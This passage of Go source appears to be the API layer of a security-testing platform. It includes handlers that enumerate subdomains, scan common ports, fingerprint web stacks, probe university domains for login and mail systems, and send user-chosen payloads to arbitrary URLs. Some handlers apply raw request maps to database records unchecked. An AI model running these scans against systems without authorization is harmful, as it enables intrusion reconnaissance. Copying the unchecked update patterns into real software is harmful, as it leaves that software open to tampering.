package api

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"github.com/kunlun-sec/lunying/internal/api/handlers"
	"github.com/kunlun-sec/lunying/internal/models"
	"github.com/kunlun-sec/lunying/internal/repository"
	"github.com/kunlun-sec/lunying/internal/service"
	"github.com/kunlun-sec/lunying/pkg/network"
	"gorm.io/gorm"
)

type API struct {
	targetService     *service.TargetService
	vulnService       *service.VulnerabilityService
	assetService      *service.AssetService
	targetRepo        *repository.TargetRepository
	vulnRepo          *repository.VulnerabilityRepository
	assetRepo         *repository.AssetRepository
	db                *gorm.DB
	networkEngine     *network.NetworkEngine
	activeScanHandler *handlers.ActiveScanHandler
}

func NewAPI(
	targetService *service.TargetService,
	vulnService *service.VulnerabilityService,
	assetService *service.AssetService,
	targetRepo *repository.TargetRepository,
	vulnRepo *repository.VulnerabilityRepository,
	assetRepo *repository.AssetRepository,
	db *gorm.DB,
	networkEngine *network.NetworkEngine,
) *API {
	api := &API{
		targetService: targetService,
		vulnService:   vulnService,
		assetService:  assetService,
		targetRepo:    targetRepo,
		vulnRepo:      vulnRepo,
		assetRepo:     assetRepo,
		db:            db,
		networkEngine: networkEngine,
	}

	if networkEngine != nil {
		api.activeScanHandler = handlers.NewActiveScanHandler(db, networkEngine)
	}

	return api
}

func (a *API) respondJSON(w http.ResponseWriter, status int, data interface{}) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(data)
}

func (a *API) respondError(w http.ResponseWriter, status int, message string) {
	a.respondJSON(w, status, map[string]string{"error": message})
}

func (a *API) ListTargets(w http.ResponseWriter, r *http.Request) {
	var targets []models.Target
	a.db.Find(&targets)
	a.respondJSON(w, http.StatusOK, targets)
}

func (a *API) CreateTarget(w http.ResponseWriter, r *http.Request) {
	var target models.Target
	if err := json.NewDecoder(r.Body).Decode(&target); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	if err := a.db.Create(&target).Error; err != nil {
		a.respondError(w, http.StatusInternalServerError, "创建目标失败")
		return
	}

	a.respondJSON(w, http.StatusCreated, target)
}

func (a *API) DeleteTarget(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	if err := a.db.Delete(&models.Target{}, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusInternalServerError, "删除目标失败")
		return
	}
	a.respondJSON(w, http.StatusOK, map[string]string{"message": "删除成功"})
}

func (a *API) ListVulnerabilities(w http.ResponseWriter, r *http.Request) {
	var vulns []models.Vulnerability
	a.db.Find(&vulns)
	a.respondJSON(w, http.StatusOK, vulns)
}

func (a *API) CreateVulnerability(w http.ResponseWriter, r *http.Request) {
	var vuln models.Vulnerability
	if err := json.NewDecoder(r.Body).Decode(&vuln); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	if err := a.db.Create(&vuln).Error; err != nil {
		a.respondError(w, http.StatusInternalServerError, "创建漏洞失败")
		return
	}

	a.respondJSON(w, http.StatusCreated, vuln)
}

func (a *API) ConfirmVulnerability(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	var vuln models.Vulnerability
	if err := a.db.First(&vuln, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusNotFound, "漏洞不存在")
		return
	}
	vuln.Status = "confirmed"
	a.db.Save(&vuln)
	a.respondJSON(w, http.StatusOK, vuln)
}

func (a *API) PatchVulnerability(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	var vuln models.Vulnerability
	if err := a.db.First(&vuln, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusNotFound, "漏洞不存在")
		return
	}

	var updates map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&updates); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	a.db.Model(&vuln).Updates(updates)
	a.respondJSON(w, http.StatusOK, vuln)
}

func (a *API) BulkVulnerabilityAction(w http.ResponseWriter, r *http.Request) {
	var req struct {
		IDs    []string `json:"ids"`
		Action string   `json:"action"`
		Note   string   `json:"note,omitempty"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	for _, id := range req.IDs {
		var vuln models.Vulnerability
		if err := a.db.First(&vuln, "id = ?", id).Error; err == nil {
			switch req.Action {
			case "confirm":
				vuln.Status = "confirmed"
			case "ignore":
				vuln.Status = "ignored"
			case "fix":
				vuln.FixStatus = "fixed"
			case "delete":
				a.db.Delete(&vuln)
				continue
			}
			a.db.Save(&vuln)
		}
	}

	a.respondJSON(w, http.StatusOK, map[string]string{"message": "批量操作完成"})
}

func (a *API) GetVulnerabilityComments(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	var comments []models.VulnerabilityComment
	a.db.Where("vulnerability_id = ?", id).Find(&comments)
	a.respondJSON(w, http.StatusOK, comments)
}

func (a *API) AddVulnerabilityComment(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	var req struct {
		Content string `json:"content"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	comment := models.VulnerabilityComment{
		VulnerabilityID: id,
		Content:         req.Content,
	}
	if err := a.db.Create(&comment).Error; err != nil {
		a.respondError(w, http.StatusInternalServerError, "添加评论失败")
		return
	}

	a.respondJSON(w, http.StatusCreated, comment)
}

func (a *API) GetAssetTree(w http.ResponseWriter, r *http.Request) {
	targetID := r.URL.Query().Get("target_id")
	var assets []models.Asset
	if targetID != "" {
		a.db.Where("target_id = ?", targetID).Find(&assets)
	} else {
		a.db.Find(&assets)
	}
	a.respondJSON(w, http.StatusOK, buildAssetTree(assets))
}

func buildAssetTree(assets []models.Asset) []map[string]interface{} {
	assetMap := make(map[string]*map[string]interface{})
	var roots []map[string]interface{}

	for _, asset := range assets {
		node := map[string]interface{}{
			"id":       asset.ID,
			"name":     asset.Name,
			"type":     asset.Type,
			"value":    asset.Value,
			"status":   asset.Status,
			"children": []map[string]interface{}{},
		}
		assetMap[asset.ID] = &node

		if asset.ParentID == "" {
			roots = append(roots, node)
		} else {
			if parent, ok := assetMap[asset.ParentID]; ok {
				(*parent)["children"] = append((*parent)["children"].([]map[string]interface{}), node)
			} else {
				roots = append(roots, node)
			}
		}
	}

	return roots
}

func (a *API) GetAsset(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	var asset models.Asset
	if err := a.db.First(&asset, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusNotFound, "资产不存在")
		return
	}
	a.respondJSON(w, http.StatusOK, asset)
}

func (a *API) PatchAsset(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	var asset models.Asset
	if err := a.db.First(&asset, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusNotFound, "资产不存在")
		return
	}

	var updates map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&updates); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	a.db.Model(&asset).Updates(updates)
	a.respondJSON(w, http.StatusOK, asset)
}

func (a *API) DeleteAsset(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	if err := a.db.Delete(&models.Asset{}, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusInternalServerError, "删除资产失败")
		return
	}
	a.respondJSON(w, http.StatusOK, map[string]string{"message": "删除成功"})
}

func (a *API) GetAssetStats(w http.ResponseWriter, r *http.Request) {
	targetID := r.URL.Query().Get("target_id")
	var total int64
	var active int64

	query := a.db.Model(&models.Asset{})
	if targetID != "" {
		query = query.Where("target_id = ?", targetID)
	}
	query.Count(&total)
	query.Where("status = ?", "active").Count(&active)

	a.respondJSON(w, http.StatusOK, map[string]int64{
		"total":  total,
		"active": active,
	})
}

func (a *API) GetVulnDashboardStats(w http.ResponseWriter, r *http.Request) {
	var total int64
	var bySeverity = make(map[string]int64)
	var byStatus = make(map[string]int64)

	a.db.Model(&models.Vulnerability{}).Count(&total)

	severities := []string{"critical", "high", "medium", "low", "info"}
	for _, s := range severities {
		var count int64
		a.db.Model(&models.Vulnerability{}).Where("severity = ?", s).Count(&count)
		bySeverity[s] = count
	}

	statuses := []string{"pending", "confirmed", "ignored", "fixed", "verified"}
	for _, s := range statuses {
		var count int64
		a.db.Model(&models.Vulnerability{}).Where("status = ?", s).Count(&count)
		byStatus[s] = count
	}

	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"total":       total,
		"by_severity": bySeverity,
		"by_status":   byStatus,
	})
}

func (a *API) GetAIStatus(w http.ResponseWriter, r *http.Request) {
	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"status":  "ok",
		"message": "AI服务正常",
	})
}

func (a *API) GetAIConfig(w http.ResponseWriter, r *http.Request) {
	var configs []models.AIConfig
	a.db.Find(&configs)
	if len(configs) > 0 {
		a.respondJSON(w, http.StatusOK, configs[0])
	} else {
		defaultConfig := models.AIConfig{}
		a.db.Create(&defaultConfig)
		a.respondJSON(w, http.StatusOK, defaultConfig)
	}
}

func (a *API) UpdateAIConfig(w http.ResponseWriter, r *http.Request) {
	var config models.AIConfig
	if err := json.NewDecoder(r.Body).Decode(&config); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	var existing models.AIConfig
	if a.db.First(&existing).Error == nil {
		config.ID = existing.ID
		a.db.Save(&config)
	} else {
		a.db.Create(&config)
	}

	a.respondJSON(w, http.StatusOK, config)
}

func (a *API) TestAIConnection(w http.ResponseWriter, r *http.Request) {
	a.respondJSON(w, http.StatusOK, map[string]string{
		"status": "success",
	})
}

func (a *API) AIChat(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Message string      `json:"message"`
		Context interface{} `json:"context,omitempty"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"response": "这是一个AI响应示例。当前使用本地AI模式，如需真实AI响应请配置AI服务。",
	})
}

func (a *API) GetEduStats(w http.ResponseWriter, r *http.Request) {
	var total int64
	a.db.Model(&models.University{}).Count(&total)

	var byLevel = make(map[string]int64)
	levels := []string{"985", "211", "本科", "专科"}
	for _, level := range levels {
		var count int64
		a.db.Model(&models.University{}).Where("level = ?", level).Count(&count)
		byLevel[level] = count
	}

	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"total":     total,
		"by_level":  byLevel,
		"provinces": make(map[string]int64),
	})
}

func (a *API) GetEduUniversities(w http.ResponseWriter, r *http.Request) {
	var universities []models.University
	query := a.db
	if level := r.URL.Query().Get("level"); level != "" {
		query = query.Where("level = ?", level)
	}
	if province := r.URL.Query().Get("province"); province != "" {
		query = query.Where("province = ?", province)
	}
	query.Find(&universities)
	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"universities": universities,
	})
}

func (a *API) GetEduSystems(w http.ResponseWriter, r *http.Request) {
	var systems []models.EduSystem
	a.db.Find(&systems)
	a.respondJSON(w, http.StatusOK, systems)
}

func (a *API) EduScan(w http.ResponseWriter, r *http.Request) {
	var req struct {
		DomainIDs []string `json:"domain_ids,omitempty"`
		Target    string   `json:"target,omitempty"`
		Type      string   `json:"type,omitempty"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	taskID := uuid.New().String()

	if req.Type == "" {
		req.Type = "sync"
	}

	go a.executeEduScanTask(taskID, req.DomainIDs, req.Target, req.Type)

	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"message": "教育SRC扫描任务已启动",
		"task_id": taskID,
		"type":    req.Type,
		"status":  "running",
	})
}

func (a *API) executeEduScanTask(taskID string, domainIDs []string, target, scanType string) {
	ctx := context.Background()

	eduResult := models.EduScanResult{
		ID:        taskID,
		TaskType:  scanType,
		Status:    "running",
		Progress:  0,
		Results:   "{}",
		StartedAt: timePtr(time.Now()),
	}
	a.db.Create(&eduResult)

	var universities []models.University

	if len(domainIDs) > 0 {
		a.db.Where("id IN ?", domainIDs).Find(&universities)
	} else if target != "" {
		a.db.Where("domain LIKE ?", "%"+target+"%").Find(&universities)
	} else {
		a.db.Limit(10).Find(&universities)
	}

	total := len(universities)
	if total == 0 {
		total = 1
	}

	scanResults := map[string]interface{}{}

	for i, uni := range universities {
		progress := ((i + 1) * 100) / total
		eduResult.Progress = progress
		a.db.Save(&eduResult)

		domain := uni.Domain
		if domain == "" {
			domain = "www." + uni.Domain
		}

		systemInfo := map[string]interface{}{
			"university": uni.Name,
			"domain":     domain,
			"level":      uni.Level,
			"province":   uni.Province,
		}

		if a.networkEngine != nil {
			resp, err := a.networkEngine.Get(ctx, "http://"+domain)
			if err == nil {
				systemInfo["status"] = resp.Status
				systemInfo["title"] = extractTitle(resp.Body)
				systemInfo["server"] = resp.Headers["server"]

				if strings.Contains(strings.ToLower(resp.Body), "统一身份认证") ||
					strings.Contains(strings.ToLower(resp.Body), "cas") {
					systemInfo["auth_system"] = "CAS统一身份认证"
				}
				if strings.Contains(strings.ToLower(resp.Body), "OA") ||
					strings.Contains(strings.ToLower(resp.Body), "办公自动化") {
					systemInfo["oa_system"] = "OA办公系统"
				}
				if strings.Contains(strings.ToLower(resp.Body), "邮件") ||
					strings.Contains(strings.ToLower(resp.Body), "mail") {
					systemInfo["mail_system"] = "邮件系统"
				}
			} else {
				systemInfo["status"] = "unreachable"
				systemInfo["error"] = err.Error()
			}
		}

		scanResults[uni.Name] = systemInfo

		eduResult.Progress = progress
		eduResult.Results = fmt.Sprintf("%v", scanResults)
		a.db.Save(&eduResult)
	}

	eduResult.Status = "completed"
	eduResult.FinishedAt = timePtr(time.Now())
	eduResult.Progress = 100
	eduResult.Results = fmt.Sprintf("%v", scanResults)
	a.db.Save(&eduResult)
}

func extractTitle(body string) string {
	if strings.Contains(body, "<title>") {
		start := strings.Index(body, "<title>") + 7
		end := strings.Index(body, "</title>")
		if end > start {
			return strings.TrimSpace(body[start:end])
		}
	}
	return "未知标题"
}

func (a *API) GetEduScanResults(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	if id != "" && id != "{id}" {
		var result models.EduScanResult
		if err := a.db.First(&result, "id = ?", id).Error; err != nil {
			a.respondError(w, http.StatusNotFound, "扫描结果不存在")
			return
		}
		a.respondJSON(w, http.StatusOK, result)
		return
	}

	var results []models.EduScanResult
	a.db.Order("created_at DESC").Limit(50).Find(&results)
	a.respondJSON(w, http.StatusOK, results)
}

func (a *API) GetVulnTechniques(w http.ResponseWriter, r *http.Request) {
	query := a.db

	if category := r.URL.Query().Get("category"); category != "" {
		query = query.Where("category = ?", category)
	}
	if severity := r.URL.Query().Get("severity"); severity != "" {
		query = query.Where("severity = ?", severity)
	}
	if difficulty := r.URL.Query().Get("difficulty"); difficulty != "" {
		query = query.Where("difficulty = ?", difficulty)
	}
	if keyword := r.URL.Query().Get("keyword"); keyword != "" {
		query = query.Where("title LIKE ? OR description LIKE ? OR tags LIKE ?",
			"%"+keyword+"%", "%"+keyword+"%", "%"+keyword+"%")
	}

	var techniques []models.VulnTechnique
	query.Order("created_at DESC").Find(&techniques)
	a.respondJSON(w, http.StatusOK, techniques)
}

func (a *API) GetVulnTechnique(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	var technique models.VulnTechnique
	if err := a.db.First(&technique, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusNotFound, "技巧不存在")
		return
	}
	a.respondJSON(w, http.StatusOK, technique)
}

func (a *API) GetVulnTechniqueStats(w http.ResponseWriter, r *http.Request) {
	var total int64
	a.db.Model(&models.VulnTechnique{}).Count(&total)

	byCategory := make(map[string]int64)
	categories := []string{"注入类", "跨站类", "认证类", "文件处理", "信息收集", "权限类", "命令注入"}
	for _, cat := range categories {
		var count int64
		a.db.Model(&models.VulnTechnique{}).Where("category = ?", cat).Count(&count)
		byCategory[cat] = count
	}

	bySeverity := make(map[string]int64)
	severities := []string{"critical", "high", "medium", "low"}
	for _, sev := range severities {
		var count int64
		a.db.Model(&models.VulnTechnique{}).Where("severity = ?", sev).Count(&count)
		bySeverity[sev] = count
	}

	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"total":       total,
		"by_category": byCategory,
		"by_severity": bySeverity,
	})
}

func (a *API) PracticeVuln(w http.ResponseWriter, r *http.Request) {
	var req struct {
		TechniqueID string `json:"technique_id"`
		Target      string `json:"target"`
		URL         string `json:"url"`
		Payload     string `json:"payload"`
		Mode        string `json:"mode"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	if req.Mode == "" {
		req.Mode = "sync"
	}

	taskID := uuid.New().String()

	go a.executeVulnPractice(taskID, req.TechniqueID, req.Target, req.URL, req.Payload)

	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"message":  "漏洞实践任务已启动",
		"task_id":  taskID,
		"mode":     req.Mode,
		"status":   "running",
	})
}

func (a *API) executeVulnPractice(taskID, techniqueID, target, url, payload string) {
	ctx := context.Background()

	result := models.VulnPracticeResult{
		ID:          taskID,
		TechniqueID: techniqueID,
		Target:      target,
		URL:         url,
		Payload:     payload,
		Status:      "running",
	}
	a.db.Create(&result)

	var finalResult string
	var status string

	if a.networkEngine != nil && url != "" {
		var resp *network.Response
		var err error

		if strings.ToLower(payload) == "get" {
			resp, err = a.networkEngine.Get(ctx, url)
		} else {
			resp, err = a.networkEngine.Post(ctx, url, payload)
		}

		if err != nil {
			finalResult = fmt.Sprintf("请求失败: %v", err)
			status = "error"
		} else {
			finalResult = fmt.Sprintf("状态码: %d\n响应大小: %d bytes\n响应时间: %dms\n响应内容:\n%s",
				resp.Status, len(resp.Body), resp.Duration, resp.Body[:min(1000, len(resp.Body))])
			if resp.Status >= 200 && resp.Status < 300 {
				status = "success"
			} else if resp.Status >= 400 {
				status = "failed"
			} else {
				status = "unknown"
			}
		}
	} else {
		finalResult = "模拟执行: " + payload + " -> " + target
		status = "simulated"
	}

	result.Result = finalResult
	result.Status = status
	a.db.Save(&result)
}

func (a *API) GetVulnPracticeResults(w http.ResponseWriter, r *http.Request) {
	var results []models.VulnPracticeResult
	query := a.db

	if techniqueID := r.URL.Query().Get("technique_id"); techniqueID != "" {
		query = query.Where("technique_id = ?", techniqueID)
	}

	query.Order("created_at DESC").Limit(100).Find(&results)
	a.respondJSON(w, http.StatusOK, results)
}

func (a *API) GetVulnPracticeResult(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	var result models.VulnPracticeResult
	if err := a.db.First(&result, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusNotFound, "结果不存在")
		return
	}
	a.respondJSON(w, http.StatusOK, result)
}

func (a *API) StartRecon(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Target  string      `json:"target"`
		Type    string      `json:"type"`
		Modules []string    `json:"modules,omitempty"`
		Options interface{} `json:"options,omitempty"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	if req.Target == "" {
		a.respondError(w, http.StatusBadRequest, "目标不能为空")
		return
	}

	if req.Type == "" {
		req.Type = "domain"
	}

	taskID := uuid.New().String()

	go a.executeReconTask(taskID, req.Target, req.Type, req.Modules)

	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"message":  "信息收集任务已启动",
		"task_id":  taskID,
		"target":   req.Target,
		"type":     req.Type,
		"status":   "running",
	})
}

func (a *API) executeReconTask(taskID, target, targetType string, modules []string) {
	ctx := context.Background()

	infoScanTask := models.InfoCollectionTask{
		ID:        taskID,
		Target:    target,
		Type:      targetType,
		Status:    "running",
		Progress:  0,
		Results:   "{}",
	}
	a.db.Create(&infoScanTask)

	totalSteps := 3
	if len(modules) > 0 {
		totalSteps = len(modules)
	}

	currentStep := 0

	if len(modules) == 0 || contains(modules, "subdomain") {
		currentStep++
		a.updateReconProgress(&infoScanTask, currentStep, totalSteps, "正在枚举子域名...")
		subdomains := a.executeSubdomainEnumeration(ctx, target)
		a.saveReconResults(taskID, "subdomain", subdomains)
	}

	if len(modules) == 0 || contains(modules, "portscan") {
		currentStep++
		a.updateReconProgress(&infoScanTask, currentStep, totalSteps, "正在扫描端口...")
		openPorts := a.executeReconPortScan(ctx, target)
		a.saveReconResults(taskID, "portscan", openPorts)
	}

	if len(modules) == 0 || contains(modules, "fingerprint") {
		currentStep++
		a.updateReconProgress(&infoScanTask, currentStep, totalSteps, "正在进行指纹识别...")
		fingerprints := a.executeFingerprint(ctx, target)
		a.saveReconResults(taskID, "fingerprint", fingerprints)
	}

	infoScanTask.Status = "completed"
	infoScanTask.Progress = 100
	infoScanTask.FinishedAt = timePtr(time.Now())
	a.db.Save(&infoScanTask)
}

func (a *API) updateReconProgress(task *models.InfoCollectionTask, current, total int, message string) {
	progress := (current * 100) / total
	task.Progress = progress
	task.Status = "running"
	a.db.Save(task)
}

func (a *API) executeSubdomainEnumeration(ctx context.Context, domain string) []map[string]interface{} {
	var results []map[string]interface{}

	if a.networkEngine == nil {
		results = append(results, map[string]interface{}{
			"subdomain": domain,
			"type":      "direct",
			"status":    "resolved",
		})
		return results
	}

	commonPrefixes := []string{"www", "mail", "ftp", "admin", "blog", "dev", "test", "api", "m", "smtp", "pop", "ns1", "web", "ns", "backup", "mx", "mysql", "autodiscover", "autoconfig", "imap", "pop3", "socket", "smtp2", "new", "old", "lists", "support", "mobile", "forum", "news", "live", "ads", "crm", "hs", "help", "assets", "j", "k", "img", "static", "cdn", "dynamic", "secure", "login", "oauth", "public", "api1", "api2", "v", "apps"}

	results = append(results, map[string]interface{}{
		"subdomain": domain,
		"type":      "direct",
		"status":    "resolved",
	})

	for _, prefix := range commonPrefixes {
		subdomain := prefix + "." + domain
		resp, err := a.networkEngine.Get(ctx, "http://"+subdomain)
		if err == nil && resp.Status < 500 {
			results = append(results, map[string]interface{}{
				"subdomain": subdomain,
				"type":      "common_prefix",
				"status":    "active",
				"code":      resp.Status,
			})
		}
	}

	return results
}

func (a *API) executeReconPortScan(ctx context.Context, target string) []map[string]interface{} {
	var results []map[string]interface{}

	if a.networkEngine == nil {
		return results
	}

	commonPorts := []int{21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017}

	openPorts := a.networkEngine.ScanPorts(target, commonPorts, 20)

	for _, port := range openPorts {
		if port.Open {
			results = append(results, map[string]interface{}{
				"port":    port.Port,
				"status":  "open",
				"service": port.Service,
				"banner":  port.Banner,
			})
		}
	}

	return results
}

func (a *API) executeFingerprint(ctx context.Context, target string) []map[string]interface{} {
	var results []map[string]interface{}

	if a.networkEngine == nil {
		return results
	}

	resp, err := a.networkEngine.Get(ctx, "http://"+target)
	if err != nil {
		return results
	}

	fingerprint := map[string]interface{}{
		"target":   target,
		"status":   resp.Status,
		"server":   resp.Headers["server"],
		"tech":     []string{},
		"body_len": len(resp.Body),
	}

	techStack := detectTechStack(resp.Body, resp.Headers)
	fingerprint["tech"] = techStack

	results = append(results, fingerprint)

	if resp.Status == 200 {
		if strings.Contains(strings.ToLower(resp.Body), "wordpress") {
			fingerprint["cms"] = "WordPress"
		}
		if strings.Contains(strings.ToLower(resp.Body), "dedecms") || strings.Contains(strings.ToLower(resp.Body), "织梦") {
			fingerprint["cms"] = "DedeCMS"
		}
		if strings.Contains(strings.ToLower(resp.Body), "thinkphp") {
			fingerprint["framework"] = "ThinkPHP"
		}
		if strings.Contains(strings.ToLower(resp.Body), "laravel") {
			fingerprint["framework"] = "Laravel"
		}
	}

	return results
}

func (a *API) saveReconResults(taskID, resultType string, results interface{}) {
	var task models.InfoCollectionTask
	if err := a.db.First(&task, "id = ?", taskID).Error; err != nil {
		return
	}

	existingResults := map[string]interface{}{}
	json.Unmarshal([]byte(task.Results), &existingResults)

	existingResults[resultType] = results
	newResultsJSON, _ := json.Marshal(existingResults)

	task.Results = string(newResultsJSON)
	a.db.Save(&task)

	now := time.Now()
	for _, result := range results.([]map[string]interface{}) {
		if resultType == "subdomain" {
			if subdomain, ok := result["subdomain"].(string); ok {
				asset := models.Asset{
					ID:          uuid.New().String(),
					Name:        subdomain,
					Value:       subdomain,
					Type:        "subdomain",
					Status:      "active",
					Importance: 3,
					Tags:        "recon",
					FirstSeen:   &now,
					LastSeen:    &now,
				}
				a.db.Create(&asset)
			}
		} else if resultType == "portscan" {
			if port, ok := result["port"].(float64); ok {
				if serviceName, ok := result["service"].(string); ok {
					asset := models.Asset{
						ID:          uuid.New().String(),
						Name:        fmt.Sprintf("%s:%d", task.Target, int(port)),
						Value:       fmt.Sprintf("%s:%d", task.Target, int(port)),
						Type:        "port",
						Status:      "active",
						Importance: 2,
						Tags:        "recon",
						FirstSeen:   &now,
						LastSeen:    &now,
					}
					_ = serviceName
					a.db.Create(&asset)
				}
			}
		}
	}
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func detectTechStack(body string, headers map[string]string) []string {
	var techs []string

	bodyLower := strings.ToLower(body)
	headerStr := fmt.Sprintf("%v", headers)

	techIndicators := map[string]string{
		"jquery":      "jQuery",
		"react":       "React",
		"vue":         "Vue.js",
		"angular":     "Angular",
		"bootstrap":   "Bootstrap",
		"tailwind":    "Tailwind CSS",
		"wordpress":   "WordPress",
		"wp-content":  "WordPress",
		"dedecms":     "DedeCMS",
		"laravel":     "Laravel",
		"thinkphp":    "ThinkPHP",
		"express":     "Express.js",
		"django":      "Django",
		"flask":       "Flask",
		"spring":      "Spring",
		"tomcat":      "Tomcat",
		"nginx":       "Nginx",
		"apache":      "Apache",
		"microsoft":   "ASP.NET",
	}

	for indicator, tech := range techIndicators {
		if strings.Contains(bodyLower, indicator) || strings.Contains(headerStr, indicator) {
			if !containsString(techs, tech) {
				techs = append(techs, tech)
			}
		}
	}

	return techs
}

func containsString(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func (a *API) StartVulnScan(w http.ResponseWriter, r *http.Request) {
	var req struct {
		TargetID string   `json:"target_id"`
		Assets   []string `json:"assets,omitempty"`
		Scanners []string `json:"scanners,omitempty"`
		POCTags  []string `json:"poc_tags,omitempty"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	a.respondJSON(w, http.StatusOK, map[string]interface{}{
		"message": "漏洞扫描任务已启动",
	})
}

func (a *API) GetVulnerability(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	var vuln models.Vulnerability
	if err := a.db.First(&vuln, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusNotFound, "漏洞不存在")
		return
	}
	a.respondJSON(w, http.StatusOK, vuln)
}

func (a *API) SearchAssets(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query().Get("q")
	targetID := r.URL.Query().Get("target_id")
	var assets []models.Asset
	query := a.db
	if targetID != "" {
		query = query.Where("target_id = ?", targetID)
	}
	if q != "" {
		query = query.Where("name LIKE ? OR value LIKE ?", "%"+q+"%", "%"+q+"%")
	}
	query.Find(&assets)
	a.respondJSON(w, http.StatusOK, assets)
}

func (a *API) ListActiveScans(w http.ResponseWriter, r *http.Request) {
	var tasks []models.ActiveScanTask
	a.db.Order("created_at DESC").Find(&tasks)
	a.respondJSON(w, http.StatusOK, tasks)
}

func (a *API) GetActiveScan(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	var task models.ActiveScanTask
	if err := a.db.First(&task, "id = ?", id).Error; err != nil {
		a.respondError(w, http.StatusNotFound, "扫描任务不存在")
		return
	}
	a.respondJSON(w, http.StatusOK, task)
}

func (a *API) CreateActiveScan(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name    string                 `json:"name"`
		Target  string                 `json:"target"`
		Type    string                 `json:"type"`
		Options map[string]interface{} `json:"options,omitempty"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		a.respondError(w, http.StatusBadRequest, "无效的请求体")
		return
	}

	if req.Target == "" {
		a.respondError(w, http.StatusBadRequest, "目标不能为空")
		return
	}

	if req.Name == "" {
		req.Name = "扫描任务 - " + req.Target
	}

	if req.Type == "" {
		req.Type = "web"
	}

	optionsJSON, _ := json.Marshal(req.Options)
	task := models.ActiveScanTask{
		ID:       uuid.New().String(),
		Name:     req.Name,
		Target:   req.Target,
		Type:     req.Type,
		Options:  string(optionsJSON),
		Status:   "pending",
		Progress: 0,
	}
	if err := a.db.Create(&task).Error; err != nil {
		a.respondError(w, http.StatusInternalServerError, "创建扫描任务失败")
		return
	}

	go a.executeActiveScanTask(task.ID, req.Target, req.Type, req.Options)

	a.respondJSON(w, http.StatusCreated, task)
}

func (a *API) executeActiveScanTask(taskID, target, scanType string, options map[string]interface{}) {
	ctx := context.Background()

	var task models.ActiveScanTask
	if err := a.db.First(&task, "id = ?", taskID).Error; err != nil {
		return
	}

	task.Status = "running"
	task.StartedAt = timePtr(time.Now())
	a.db.Save(&task)

	switch scanType {
	case "web":
		a.executeWebScan(ctx, taskID, target, options)
	case "port":
		a.executePortScan(ctx, taskID, target, options)
	case "vuln":
		a.executeVulnScan(ctx, taskID, target, options)
	default:
		a.executeWebScan(ctx, taskID, target, options)
	}

	task.Status = "completed"
